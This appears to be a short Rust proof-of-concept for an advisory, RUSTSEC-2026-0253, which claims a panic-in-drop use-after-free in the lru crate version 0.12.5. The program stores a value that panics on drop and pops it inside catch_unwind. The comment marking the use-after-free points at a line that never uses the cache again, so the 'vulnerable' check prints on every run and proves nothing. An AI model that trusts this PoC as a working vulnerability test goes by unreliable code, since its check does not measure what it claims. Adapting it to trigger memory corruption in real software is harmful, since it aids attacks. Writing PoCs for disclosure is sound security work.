// PoC concept for RUSTSEC-2026-0253 - panic safety
use lru::LruCache;
use std::num::NonZeroUsize;

struct PanicOnDrop;
impl Drop for PanicOnDrop {
    fn drop(&mut self) {
        panic!("panic in drop - triggers UAF in lru 0.12.5");
    }
}

fn main() {
    let mut cache = LruCache::new(NonZeroUsize::new(2).unwrap());
    cache.put(1, PanicOnDrop);
    // pop() that causes drop -> panic -> internal state corrupted
    let _ = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
        cache.pop(&1);
    }));
    // ถ้าเป็น 0.12.5 จะ use-after-free ตรงนี้
    println!("If this prints with corrupted state, vulnerable");
}